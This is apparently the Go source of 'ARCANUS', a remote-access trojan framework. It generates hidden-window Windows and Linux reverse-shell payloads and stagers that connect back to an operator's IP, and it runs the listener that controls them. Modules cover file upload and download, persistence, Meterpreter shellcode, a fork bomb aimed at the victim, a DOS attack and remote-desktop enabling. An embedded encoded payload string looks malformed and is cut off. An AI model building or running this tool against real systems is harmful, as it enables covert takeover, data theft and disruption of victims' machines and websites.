package main

import "net"
import "time"
import "net/http"
import "fmt"
import "bufio"
import "os"
import "strings"
import "runtime"
import "io"
import "io/ioutil"
import "encoding/base64"
import "color"
import "os/exec"
import "path/filepath"

var SysGuide []string
var GLOBAL__Command string
var Menu_Selector int
var Listen_Port string
var Payload PAYLOAD
var Conn_Point *net.Conn

const BUFFER_SIZE int = 1024
const VERSION string = "1.5.1" 


type PAYLOAD struct {
  Ip string
  Port string
  Type string
}

func main() {

  CLEAR_SCREEN()
  BANNER()
  MAIN_MENU()
  fmt.Scan(&Menu_Selector) // Main Menu

  for {
    if Menu_Selector == 1 {
      CLEAR_SCREEN()
      BANNER()
      PAYLOAD_MENU()
      fmt.Scan(&Menu_Selector) // Payload Menu
      if Menu_Selector == 1 {
        Payload.Type = "Windows"
      }else if Menu_Selector == 2 {
        Payload.Type = "Linux"
      }else if Menu_Selector == 3 {
        Payload.Type = "Stager_Windows"
      }else if Menu_Selector == 4 {
        Payload.Type = "Stager_Linux"
      }
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Listen_Port)
      if Payload.Type == "Stager_Windows" {
        GENERATE_WINDOWS_PAYLOAD()
      }else if Payload.Type == "Stager_Linux" {
        GENERATE_LINUX_PAYLOAD()
      }
      CLEAR_SCREEN()
      BANNER()
      color.Yellow("\n[*] Port:"+string(Listen_Port))
      break
    }else if Menu_Selector == 2 {
      Payload.Type = "Windows"
      CLEAR_SCREEN()
      BANNER()
      fmt.Print("\nEnter Listening Ip: ")
      fmt.Scan(&Payload.Ip)
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Payload.Port)
      Listen_Port = Payload.Port
      GENERATE_WINDOWS_PAYLOAD()
      CLEAR_SCREEN()
      BANNER()
      if runtime.GOOS == "windows" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] Payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }else if runtime.GOOS == "linux" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] Payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }
      break
    }else if Menu_Selector == 3 {
      Payload.Type = "Linux"
      CLEAR_SCREEN()
      BANNER()
      fmt.Print("\nEnter Listening Ip: ")
      fmt.Scan(&Payload.Ip)
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Payload.Port)
      Listen_Port = Payload.Port
      GENERATE_LINUX_PAYLOAD()
      CLEAR_SCREEN()
      BANNER()
      if runtime.GOOS == "windows" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] Payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }else if runtime.GOOS == "linux" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] Payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }
      break
    }else if Menu_Selector == 4 {
      Payload.Type = "Stager_Windows"
      CLEAR_SCREEN()
      BANNER()
      fmt.Print("\nEnter Listening Ip: ")
      fmt.Scan(&Payload.Ip)
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Payload.Port)
      Listen_Port = Payload.Port
      GENERATE_WINDOWS_STAGER_PAYLOAD()
      CLEAR_SCREEN()
      BANNER()
      if runtime.GOOS == "windows" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] First stage payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }else if runtime.GOOS == "linux" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] First stage payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }
      break
    }else if Menu_Selector == 5 {
      Payload.Type = "Stager_Linux"
      CLEAR_SCREEN()
      BANNER()
      fmt.Print("\nEnter Listening Ip: ")
      fmt.Scan(&Payload.Ip)
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Payload.Port)
      Listen_Port = Payload.Port
      GENERATE_LINUX_STAGER_PAYLOAD()
      CLEAR_SCREEN()
      BANNER()
      if runtime.GOOS == "windows" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] First stage payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }else if runtime.GOOS == "linux" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] First stage payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }
      break
    }else if Menu_Selector == 6 {
      	response, err := http.Get("https://raw.githubusercontent.com/EgeBalci/ARCANUS/master/ARCANUS.go");
      	if err != nil {
      		color.Red("\n[!] Update Connection Failed !")
      		fmt.Println(err)
      	};
      	defer response.Body.Close();
      	body, _ := ioutil.ReadAll(response.Body);
    	if strings.Contains(string(body), string(VERSION)) {
        	color.Green("\n[+] Arcanus Version Up To Date !")
        	time.Sleep(2*time.Second)
        	main()
      	}else{
        	color.Blue("\n[*] New Version Detected !")
        	var Choice string = "N"
        	color.Blue("\n[?] Do You Want To Update ? (Y/N) : ")  
        	fmt.Print("\n\n>>")
        	fmt.Scan(&Choice)
        	if Choice == "Y" || Choice == "y" {
          		if runtime.GOOS == "windows" {
            		color.Yellow("\n[*] Updating ARCANUS...")
            		exec.Command("cmd", "/C", "Update.exe").Start()
            		os.Exit(1)
          		}else if runtime.GOOS == "linux" {
            		color.Yellow("\n[*] Updating ARCANUS...")
            		Update, _ := os.Create("Update.sh")

            		Update.WriteString("chmod 777 Update\n./Update")
            		Update.Close()
            		exec.Command("sh", "-c", "chmod 777 Update && ./Update.sh").Run()
            		exec.Command("sh", "-c", "./Update.sh").Run()
            		exec.Command("sh", "-c", "rm Update.sh").Run()
            		os.Exit(1)
          		}
        	}else if Choice == "N" || Choice == "n" {
          		main()
        	}else{
          		color.Blue("\n[?] Do You Want To Update ? (Y/N) : ")  
          		fmt.Scan(&Choice)
          		fmt.Print("\n\n>>")
        	}
      	}
    }else{
      main()
    }
  }



  if Payload.Type == "Stager_Windows" || Payload.Type == "Stager_Linux" {
    color.Yellow("\n[*] Listening For Reverse TCP Stager Shell...")
    ln, _ := net.Listen("tcp", ":"+Listen_Port)
    connect, _ := ln.Accept()
    color.Green("[+] Connection Established !")
    file, err := os.Open("Payload.exe")
    if err != nil {
      color.Red("\n[-] Eror while accesing Payload.exe !")
      color.Red("\n[*] Put second stage payload on same directory with ARCANUS and rename it \"Payload.exe\" ")
    }
    color.Yellow("[*] Sending Second Stage Payload...")
    io.Copy(connect, file)
    color.Green("[+] Payload transfer completed !")
    color.Yellow("[*] Executeing Second Stage Payload...")
    runtime.GC()
  }


  color.Yellow("\n[*] Listening For Reverse TCP Shell...")
  ln, _ := net.Listen("tcp", ":"+Listen_Port)
  connect, err := ln.Accept()
  if err != nil {
    fmt.Println(err)
  }
  reader := bufio.NewReader(os.Stdin)
  var SysInfo = make([]byte, BUFFER_SIZE)
  fmt.Print("\x07") // Connection Launched !
  color.Green("\n[+] Connection Established !\n")
  connect.Read([]byte(SysInfo))
  SysGuide = strings.Split(string(SysInfo), "£>")
  color.Green("\n[+] Remote Address -> " , connect.RemoteAddr())
  
  color.Green(string(("\n\n[+] OS Version Captured" + SysGuide[1])))  
  

  
  if Payload.Type == "Linux" || Payload.Type == "Stager_Linux" {
    for {
      runtime.GC()
      fmt.Print("\n")
      fmt.Print("\n")
      fmt.Print(string(SysGuide[0]) + ">")
      Command, _ := reader.ReadString('\n')
      _Command := string(Command)
      GLOBAL__Command = _Command
      runtime.GC()
      var cmd_out []byte
      connect.Write([]byte(Command))
      go connect.Read([]byte(cmd_out))
      fmt.Println(string(cmd_out))
    }
  }

  for { 

    var cmd_out = make([]byte,BUFFER_SIZE)
    runtime.GC()
    fmt.Print("\n")
    fmt.Print("\n")
    fmt.Print(string(SysGuide[0]) + ">")
    Command, _ := reader.ReadString('\n')
    _Command := string(Command)
    GLOBAL__Command = _Command

    if strings.Contains(_Command, "£METERPRETER") || strings.Contains(_Command, "£meterpreter") {
      color.Green("\n[*] Meterpreter Code Send !")
      connect.Write([]byte(Command))
    }else if strings.Contains(_Command, "£desktop") || strings.Contains(_Command, "£DESKTOP") {
      if Payload.Type == "Windows" || Payload.Type == "Stager_Windows" {
        connect.Write([]byte(Command)) 
        connect.Read([]byte(cmd_out))
        Command_Output := strings.Split(string(cmd_out), "£>")
        if strings.Contains(string(Command_Output[0]), "failed") {
          color.Red("\n[-] Remote desktop connection failed ! (Acces denied, The requested operation requires Administration elavation.) ")
        }else{
          color.Green("\n[+] Remote desktop connection configurations succesfull !.")
          color.Green("\n >>> Remote Address >>> " , connect.RemoteAddr())
          if runtime.GOOS == "windows" {
            exec.Command("cmd", "/C", "mstsc").Run()
          }
        }
      }else{
        color.Red("\n[-] This payload type does not support \"REMOTE DESKTOP\" module !")
      }
    }else if strings.Contains(_Command, "£persistence") || strings.Contains(_Command, "£PERSISTENCE") {
    	connect.Write([]byte(GLOBAL__Command))
    }else if strings.Contains(_Command, "£help") || strings.Contains(_Command, "£HELP")  {
      if runtime.GOOS == "windows" {
        HELP_SCREEN_WIN()
      }else if runtime.GOOS == "linux" {
        HELP_SCREEN_LINUX()
      }
    }else if strings.Contains(_Command, "£upload -f") || strings.Contains(_Command, "£UPLOAD -F") {
      connect.Write([]byte(_Command))
      file_name := strings.Split(GLOBAL__Command, "\"")
      color.Yellow("\n[*] Uploading ---> "+file_name[1])
      go UPLOAD_VIA_TCP()
    }else if strings.Contains(_Command, "£download") || strings.Contains(_Command, "£DOWNLOAD") {
      connect.Write([]byte(Command))
      go DOWNLOAD_VIA_TCP()
    }else if strings.Contains(_Command, "£DISTRACT") || strings.Contains(_Command, "£distract") {
      connect.Write([]byte(Command))
      color.Yellow("\n[*] Preparing fork bomb...")
      color.Green("\n[+] Distraction Started !")
    }else if strings.Contains(_Command, "£DOS") || strings.Contains(_Command, "£dos") {
      DOS_Target := strings.Split(GLOBAL__Command, "\"")
      if strings.Contains(DOS_Target[1], "http//") || strings.Contains(DOS_Target[1], "https//") {
        connect.Write([]byte(Command))
        color.Yellow("\n[*] Starting DOS Atack to --> "+DOS_Target[1])
        color.Green("\n[+] DOS Atack Started !")
        color.Green("\n[+] Sending 1000 GET request to target...")
      }else{
        color.Red("\n[-] ERROR: Invalid URL type !")
      }
    }else{
      connect.Write([]byte(Command))
      for {
        connect.Read([]byte(cmd_out))
        if !strings.Contains(string(cmd_out), "£>") {
          fmt.Println(string(cmd_out))
        }else{
          Command_Output := strings.Split(string(cmd_out), "£>")
          fmt.Println(string(Command_Output[0]))
          break
        }
      }
    }
  }
}




func UPLOAD_VIA_TCP() {
  ln, _ := net.Listen("tcp", ":55888")
  connect, _ := ln.Accept()
  file_name := strings.Split(GLOBAL__Command, "\"")
  file, err := os.Open(file_name[1])
  if err != nil {
    color.Red("Eror while opening file !")
    fmt.Println(err)
  }
  defer file.Close()
  io.Copy(connect, file)
  color.Green("\n\n[+] File transfer completed !")
  fmt.Print("\n")
  fmt.Print("\n")
  fmt.Print(string(SysGuide[0]) + ">")
  connect.Close()
}


func DOWNLOAD_VIA_TCP() {
  file_name := strings.Split(GLOBAL__Command, "\"")
  color.Yellow("\n\n[*] Downloading "+string(file_name[1]))
  ln, _ := net.Listen("tcp", ":55888")
  connect, _ := ln.Accept()
  file, _ := os.Create(file_name[1])
  defer file.Close()
  io.Copy(file, connect)
  file.Close() 
  connect.Close()
  color.Green("\n[+] File download completed !")
  fmt.Print("\n")
  fmt.Print("\n")
  fmt.Print(string(SysGuide[0]) + ">")
}


func BANNER() {
  if runtime.GOOS == "windows" {
    color.Red("            ___  ______  _____   ___   _   _ _   _ _____ ")
    color.Red("           / _ \\ | ___ \\/  __ \\ / _ \\ | \\ | | | | /  ___|")
    color.Red("          / /_\\ \\| |_/ /| /  \\// /_\\ \\|  \\| | | | \\ `--. ")
    color.Red("          |  _  ||    / | |    |  _  || . ` | | | |`--. \\")
    color.Red("          | | | || |\\ \\ | \\__/\\| | | || |\\  | |_| /\\__/ /")
    color.Red("          \\_| |_/\\_| \\_| \\____/\\_| |_/\\_| \\_/\\___/\\____/ ")
    color.Green("\n\n+ -- --=[      ARCANUS FRAMEWORK                  ]")
    color.Green("+ -- --=[ Version: "+VERSION+"                         ]")
    color.Green("+ -- --=[ Support: arcanusframework@gmail.com     ]")
    color.Green("+ -- --=[          Created By Ege Balcı           ]")
  }else if runtime.GOOS == "linux" {
    color.Red("           _______  _______  _______  _______  _                 _______ ")
    color.Red("          (  ___  )(  ____ )(  ____ \\(  ___  )( (    /||\\     /|(  ____ \\")
    color.Red("          | (   ) || (    )|| (    \\/| (   ) ||  \\  ( || )   ( || (    \\/")
    color.Red("          | (___) || (____)|| |      | (___) ||   \\ | || |   | || (_____ ")
    color.Red("          |  ___  ||     __)| |      |  ___  || (\\ \\) || |   | |(_____  )")
    color.Red("          | (   ) || (\\ (   | |      | (   ) || | \\   || |   | |      ) |")
    color.Red("          | )   ( || ) \\ \\__| (____/\\| )   ( || )  \\  || (___) |/\\____) |")
    color.Red("          |/     \\||/   \\__/(_______/|/     \\||/    )_)(_______)\\_______)")

    color.Green("\n\n+ -- --=[      ARCANUS FRAMEWORK                  ]")
    color.Green("+ -- --=[ Version: "+VERSION+"                         ]")
    color.Green("+ -- --=[ Support: arcanusframework@gmail.com     ]")
    color.Green("+ -- --=[          Created By Ege Balcı           ]")

  }  
}

func CLEAR_SCREEN() {
  if runtime.GOOS == "windows" {
    Clear := exec.Command("cmd", "/C", "cls") 
    Clear.Stdout = os.Stdout
    Clear.Run()
  }else if runtime.GOOS == "linux" {
    Clear := exec.Command("clear") 
    Clear.Stdout = os.Stdout
    Clear.Run()
  }
}

func GENERATE_WINDOWS_PAYLOAD() {
  Payload.Ip = string("\""+Payload.Ip+"\";")
  Payload.Port = string("\""+Payload.Port+"\";")
  Payload_Source, err := os.Create("Payload.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()

  WINDOWS_PAYLOAD, _ := base64.StdEncoding.DecodeString(WIN_PAYLOAD)

  Index := strings.Replace(string(WINDOWS_PAYLOAD), "\"127.0.0.1\";", Payload.Ip, -1)
  Index = strings.Replace(Index, "\"8552\";", Payload.Port, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    Builder, err := os.Create("Build.bat")
    if err != nil {
      fmt.Println(err)
    }
    Build_Code := string("go build -ldflags \"-H windowsgui -s\" Payload.go ")
    Builder.WriteString(Build_Code)
    runtime.GC()
    exec.Command("cmd", "/C", "Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", " del Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", "del Payload.go").Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {
    exec.Command("sh", "-c", "export GOOS=windows && export GOARCH=386 && go build -ldflags \"-H windowsgui -s\" Payload.go && export GOOS=linux && export GOARCH=amd64").Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Payload.go").Run()
  }
}



func GENERATE_LINUX_PAYLOAD() {
  Payload.Ip = string("\""+Payload.Ip+"\";")
  Payload.Port = string("\""+Payload.Port+"\";")
  Payload_Source, err := os.Create("Payload.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()

  Linux_Payload, _ := base64.StdEncoding.DecodeString(LINUX_PAYLOAD)

  Index := strings.Replace(string(Linux_Payload), "\"127.0.0.1\";", Payload.Ip, -1)
  Index = strings.Replace(Index, "\"8552\";", Payload.Port, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    Builder, err := os.Create("Build.bat")
    if err != nil {
      fmt.Println(err)
    }
    var Build_Code = `
    set GOOS=linux
    set GOARCH=386
    go build Payload.go 
    set GOOS=windows
    set GOARCH=amd64
    `
    Builder.WriteString(Build_Code)
    runtime.GC()
    exec.Command("cmd", "/C", "Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", " del Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", "del Payload.go").Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {

    exec.Command("sh", "-c", "go build Payload.go").Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Payload.go").Run()
  }
}

func GENERATE_WINDOWS_STAGER_PAYLOAD() {
  go GENERATE_WINDOWS_PAYLOAD()
  Stager_Payload_Ip := string("\""+Payload.Ip+"\";")
  Stager_Payload_Port := string("\""+Payload.Port+"\";")
  Payload_Source, err := os.Create("Stage_1.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()

  WIN_STAGER, _ := base64.StdEncoding.DecodeString(WIN_STAGER_PAYLOAD)

  Index := strings.Replace(string(WIN_STAGER), "\"127.0.0.1\";", Stager_Payload_Ip, -1)
  Index = strings.Replace(Index, "\"8552\";", Stager_Payload_Port, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    Builder, err := os.Create("Build_Stager.bat")
    if err != nil {
      fmt.Println(err)
    }
    Build_Code := string("go build -ldflags \"-s -H windowsgui\" Stage_1.go ")
    Builder.WriteString(Build_Code)
    runtime.GC()
    Build_Stager := exec.Command("cmd", "/C", "Build_Stager.bat");
    Build_Stager.Run()
    runtime.GC()
    Del_Stager := exec.Command("cmd", "/C", "del Stage_1.go");
    Del_Stager.Run()
    runtime.GC()
    Del_Stager_2 := exec.Command("cmd", "/C", "del Build_Stager.bat");
    Del_Stager_2.Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {
    exec.Command("sh", "-c", "export GOOS=windows && export GOARCH=386 && go build -ldflags \"-s -H windowsgui\" Stage_1.go").Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Stage_1.go").Run()
    runtime.GC()
  }
}


func GENERATE_LINUX_STAGER_PAYLOAD() {
  go GENERATE_LINUX_PAYLOAD()
  Stager_Payload_Ip := string("\""+Payload.Ip+"\";")
  Stager_Payload_Port := string("\""+Payload.Port+"\";")
  Payload_Source, err := os.Create("Stage_1.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()

  LINUX_STAGER, _ := base64.StdEncoding.DecodeString(LINUX_STAGER_PAYLOAD)

  Index := strings.Replace(string(LINUX_STAGER), "\"127.0.0.1\";", Stager_Payload_Ip, -1)
  Index = strings.Replace(Index, "\"8552\";", Stager_Payload_Port, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    Builder, err := os.Create("Build_Stager.bat")
    if err != nil {
      fmt.Println(err)
    }
    Build_Code := `
    SET GOOS=linux
    SET GOARCH=386
    go build Stage_1.go`
    Builder.WriteString(Build_Code)
    runtime.GC()
    Build_Stager := exec.Command("cmd", "/C", "Build_Stager.bat");
    Build_Stager.Run()
    runtime.GC()
    Del_Stager := exec.Command("cmd", "/C", "del Stage_1.go");
    Del_Stager.Run()
    runtime.GC()
    Del_Stager_2 := exec.Command("cmd", "/C", "del Build_Stager.bat");
    Del_Stager_2.Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {
    exec.Command("sh", "-c", "go build Stage_1.go").Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Stage_1.go").Run()
    runtime.GC()
  }
}



func MAIN_MENU() {
  
  color.Yellow("\n [1] START LISTENING")
  color.Yellow("\n [2] GENERATE WINDOWS PAYLOAD                   (4.5 Mb)")
  color.Yellow("\n [3] GENERATE LINUX PAYLOAD                     (3.6 Mb)")
  color.Yellow("\n [4] GENERATE STAGER WINDOWS PAYLOAD            (2.0 Mb)")
  color.Yellow("\n [5] GENERATE STAGER LINUX PAYLOAD              (2.0 Mb)")
  color.Yellow("\n [6] UPDATE")
  fmt.Print("\n\n>>")
}


func PAYLOAD_MENU() {
  color.Yellow("\n\n[1] Windows payload")
  color.Yellow("[2] Linux payload")
  color.Yellow("[3] Stager windows payload")
  color.Yellow("[4] Stager linux payload")
  fmt.Print("\n\n>>")
}

func HELP_SCREEN_LINUX() {
  color.Yellow("#===================================================================================================#")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   [ COMMAND ]                                       [DESCRIPTION]                                 |")
  color.Yellow("|  ===================================              ======================================          |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £METERPRETER -C \"powershell shellcode\":   This command executes given powershell            |")
  color.Yellow("|                                                      shellcode for metasploit integration.        |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £PERSISTENCE:                                 This command installs a persistence module    |")
  color.Yellow("|                                                       to remote computer for continious acces.    |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £DISTRACT:                                   This command executes a fork bomb bat file to  |")
  color.Yellow("|                                                       distrackt the remote user.                  |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £UPLOAD -F \"filename.exe\":                This command uploads a choosen file to            |")
  color.Yellow("|                                                       remote computer via tcp socket stream.      |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £UPLOAD -G:                                   This command uploads a choosen file to        |")
  color.Yellow("|                                                       remote computer via http get method.        |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £DOWNLOAD -F \"filename.exe\":              This command download a choosen file              |")
  color.Yellow("|                                                       from remote computer via tcp socket stream. |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £DOS -A \"www.site.com\":               This command starts a denial of service atack to    |")
  color.Yellow("|                                                                         given website address.    |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £PLEASE \"any command\":                    This command asks users comfirmation for          |")
  color.Yellow("|                                                       higher privilidge operations.               |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £DESKTOP                                      This command adjusts remote desktop options   |")
  color.Yellow("|                                                       for remote connection on target machine     |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("#===================================================================================================#")
}



func HELP_SCREEN_WIN() {

  color.Yellow("#=============================================================================#")//
  color.Yellow("|                                                                             |")
  color.Yellow("|   [ COMMAND ]                                               [DESCRIPTION]   |")
  color.Yellow("|  ==============                                            ================ |")
  color.Yellow("|                                                                             |")
  color.Yellow("|  £METERPRETER -C \"powershell shellcode\":     This command executes given    |")
  color.Yellow("|                                                   powershell shellcode for  |")
  color.Yellow("|                                                   metasploit integration.   |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £PERSISTENCE:               This command installs a persistence module to   |")
  color.Yellow("|                                       remote computer for continious acces. |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £UPLOAD -F \"filename.exe\":        This command uploads a choosen file to    |")
  color.Yellow("|                                      remote computer via tcp socket stream. |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £UPLOAD -G:                   This command uploads a choosen file to remote |")
  color.Yellow("|                                             computer via http get method.   |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £DOWNLOAD -F \"filename.exe\":  This command download a choosen file from     |")
  color.Yellow("|                                      remote computer via tcp socket stream. |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £DISTRACT:                    This command executes a fork bomb bat file to |")
  color.Yellow("|                                                distrackt the remote user.   |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £DOS -A \"www.site.com\":    This command starts a denial of service atack    |")
  color.Yellow("|                                                      given website address. |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £PLEASE \"any command\":           This command asks users comfirmation for   |")
  color.Yellow("|                                              higher privilidge operations.  |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £DESKTOP                        This command adjusts remote desktop options |")
  color.Yellow("|                                    for remote connection on target machine  |")
  color.Yellow("|                                                                             |")
  color.Yellow("#=============================================================================#")
}



var WIN_PAYLOAD string = "a7061636b616765206d61696e3baa696d706f727420226e6574223ba696d706f727420226f732f65786563223ba696d706f72742022627566696f223ba696d706f727420226f73223ba696d706f72742022737472696e6773223ba696d706f72742022706174682f66696c6570617468223ba696d706f7274202272756e74696d65223ba696d706f7274202273797363616c6c223ba696d706f727420226e65742f68747470223ba696d706f7274202274696d65223ba696d706f72742022696f2f696f7574696c223ba696d706f72742022696f223ba696d706f72742022666d7422aa76617220476c6f62616c5f5f436f6d6d616e6420737472696e673ba7661722066696c655f7472616e736665725f73756363657320626f6f6c3ba76617220444f535f54617267657420737472696e673ba76617220444f535f526571756573745f436f756e74657220696e74203d20303ba76617220444f535f526571756573745f4c696d697420696e74203d20313030303baa636f6e73742056494354494d5f495020737472696e67203d20223132372e302e302e31223ba636f6e73742056494354494d5f504f525420737472696e67203d202238353532223baa66756e63206d61696e2829207ba2020202020202020202020202020202020202020202020202020a2020636f6e6e6563742c20657272203a3d206e65742e4469616c2822746370222c2056494354494d5f49502b223a222b56494354494d5f504f5254293b2020202020202020202020202020202020202020202020202020202020a202069662065727220213d206e696c207b2020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a2020202074696d652e536c65657028352a74696d652e5365636f6e64293b2020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a202020206d61696e28293b202020202020202020202020202020202020202020202020202020202020202020202020a20207d3b2020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a20a20206469722c205f203a3d2066696c65706174682e4162732866696c65706174682e446972286f732e417267735b305d29293b2020202020a202056657273696f6e5f436865636b203a3d20657865632e436f6d6d616e642822636d64222c20222f43222c202276657222293ba202056657273696f6e5f436865636b2e53797350726f6341747472203d202673797363616c6c2e53797350726f63417474727b4869646557696e646f773a20747275657d3ba202076657273696f6e2c205f203a3d2056657273696f6e5f436865636b2e4f757470757428293b2020202020202020202020a20205379734775696465203a3d2028737472696e672864697229202b202220a33e2022202b20737472696e672876657273696f6e29202b202220a33e2022293b202020202020a2020636f6e6e6563742e5772697465285b5d6279746528737472696e672853797347756964652929293b202020202020202020202020202020202020a202020202020202020202020202020202020202020202020202020202020202020202020202020a20a2020a2020666f72207ba20202020a20202020436f6d6d616e642c205f203a3d20627566696f2e4e657752656164657228636f6e6e656374292e52656164537472696e6728275c6e27293b2020202020202020202020202020202020202020202020a202020205f436f6d6d616e64203a3d20737472696e6728436f6d6d616e64293b20202020202020202020202020202020202020202020a20202020476c6f62616c5f5f436f6d6d616e64203d205f436f6d6d616e643b2020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a20202020aa20202020a20202020696620737472696e67732e436f6e7461696e73285f436f6d6d616e642c2022a375706c6f6164202d672229207c7c20737472696e67732e436f6e7461696e73285f436f6d6d616e642c2022a355504c4f4144202d472229207b20a20202020202055504c4f41445f5649415f47455428293b20a202020202020766172207472616e736665725f726573706f6e736520737472696e673ba20202020202069662066696c655f7472616e736665725f737563636573203d3d2074727565207b202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a20202020202020207472616e736665725f726573706f6e7365203d20225b2b5d2046696c65205472616e73666572205375636365737366756c6c202120a33e223b20202020202020202020202020202020202020a2020202020202020636f6e6e6563742e5772697465285b5d6279746528737472696e67287472616e736665725f726573706f6e73652929293b202020202020202020202020202020202020a2020202020207d3b202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a20202020202069662066696c655f7472616e736665725f737563636573203d3d2066616c7365207b2020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a20202020202020207472616e736665725f726573706f6e7365203d20225b2d5d2046696c65205472616e73666572204661696c6564202120a33e223b20202020202020202020202020202020202020202020202020a2020202020202020636f6e6e6563742e5772697465285b5d6279746528737472696e67287472616e736665725f726573706f6e73652929293b202020202020202020202020202020202020202020202020a2020202020207d3ba202020207d656c736520696620737472696e67732e436f6e7461696e73285f436f6d6d616e642c2022a3706c656173652229207c7c20737472696e67732e436f6e7461696e73285f436f6d6d616e642c2022a3504c454153452229207b20a202020202020636f6e6e6563742e5772697465285b5d62797465285341595f504c45415345282929293ba202020207d656c736520696620737472696e67732e436f6e7461696e73285f436f6d6d616e642c2022a3646f776e6c6f61642229207c7c20737472696e67732e436f6e7461696e73285f436f6d6d616e642c2022a3444f574e4c4f41442229207b20a202020202020676f20444f574e4c4f41445f5649415f54435028293ba202020207d656c736520696620737472696e67732e436f6e7461696e73285f436f6d6d616e642c2022a375706c6f6164202d662229207c7c20737472696e67732e436f6e7461696e73285f436f6d6d616e642c2022a355504c4f4144202d46202229207ba202020202020676f2055504c4f41445f5649415f54435028293b202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a202020207d656c736520696620737472696e67732e436f6e7461696e73285f436f6d6d616e642c2022a34d45544552505245544552202d432229207c7c20737472696e67732e436f6e7461696e73285f436f6d6d616e642c2022a36d65746572707265746572202d632229207b20a2020202020204d455445525052455445525f43524541544528293b2020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020a202020207d656c736520696620737472696e67732e436f6e7461696e73285f436f6d6d616e642c2022a3444f532229207c7c20737472696e67732e436f6e7461696e73285f436f6